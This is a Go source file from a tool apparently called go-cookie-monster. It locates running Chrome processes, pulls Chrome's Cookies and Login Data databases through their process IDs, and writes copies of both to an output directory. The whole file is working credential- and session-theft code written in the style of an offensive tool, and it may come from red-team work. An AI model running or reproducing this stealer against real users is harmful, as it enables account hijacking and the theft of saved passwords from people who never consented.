package cookiemonster

import (
	"fmt"
	"go-cookie-monster/pkg/chromefile"
	"go-cookie-monster/pkg/processes"
	"log"
	"os"
	"path/filepath"
)

func ProcessFileMode(browserPattern, outputDir string, writeFiles bool) *chromefile.ChromeFiles {
	var err error

	// If output directory is not provided, use the current working directory
	if outputDir == "" && writeFiles {
		outputDir, err = os.Getwd()
		if err != nil {
			log.Fatalf("error getting current working directory: %v", err)
		}
	}

	// Find browser processes
	fmt.Printf("\n[*] Attempting to identify %s processes...\n", browserPattern)
	browserProcs, err := fetchProcessIds(browserPattern)
	if err != nil {
		log.Fatalf("Error fetching process IDs: %v", err)
	}

	// Print process IDs
	printProcessIds(browserProcs)

	// Get browser files
	fmt.Println("\n[*] Attempting to access Chrome files...")
	browserFiles, err := fetchChromeFiles(browserProcs)
	if err != nil {
		log.Fatalf("Error fetching Chrome files: %v", err)
	}

	fmt.Println("\n[*] File acquisition summary:")
	fmt.Printf("    Cookies (%d bytes): %s\n",
		browserFiles.Cookies.Size,
		browserFiles.Cookies.Path)
	fmt.Printf("    Login Data (%d bytes): %s\n",
		browserFiles.LoginData.Size,
		browserFiles.LoginData.Path)

	if writeFiles {
		writeDatabaseFiles(browserFiles, outputDir)
	}

	return browserFiles
}

// fetchProcessIds fetches the process IDs whose names match the given pattern
func fetchProcessIds(pattern string) ([]processes.Process, error) {
	browserProcs, err := processes.FindProcess(pattern)
	if err != nil {
		return nil, err
	}

	return browserProcs, nil

}

// printProcessIds prints the process IDs
func printProcessIds(pids []processes.Process) {
	if len(pids) == 0 {
		fmt.Println("[-] No processes found")
	} else {
		fmt.Printf("[+] Found %d browser processes:\n", len(pids))
		for _, proc := range pids {
			fmt.Printf("  %s    - PID: %d\n", proc.Name, proc.ID)
		}
	}
}

// fetchChromeFiles fetches the Chrome files
func fetchChromeFiles(browserProcs []processes.Process) (*chromefile.ChromeFiles, error) {
	// Get PIDs
	var pids []uint32
	for _, proc := range browserProcs {
		pids = append(pids, proc.ID)
	}

	// Get Chrome files
	files, err := chromefile.GetChromeFiles(pids)
	if err != nil {
		return nil, err
	}

	return files, nil
}

func writeDatabaseFiles(browserFiles *chromefile.ChromeFiles, outputDir string) {
	var err error

	// Write the files to disk
	fmt.Println("\n[*] Attempting to write Chrome files to disk...")
	cookiesDbFilePath := filepath.Join(outputDir, outputCookieDbName)
	loginDataDbFilePath := filepath.Join(outputDir, outputLoginDbName)

	err = os.WriteFile(cookiesDbFilePath, browserFiles.Cookies.Data, 0644)
	if err != nil {
		log.Printf("[-] Error writing Cookies file: %v", err)
	} else {
		fmt.Printf("[+] Cookies file written to: \"%s\"\n", cookiesDbFilePath)
	}

	err = os.WriteFile(loginDataDbFilePath, browserFiles.LoginData.Data, 0644)
	if err != nil {
		log.Printf("[-] Error writing Login Data file: %v", err)
	} else {
		fmt.Printf("[+] Login Data file written to: \"%s\"\n", loginDataDbFilePath)
	}
}
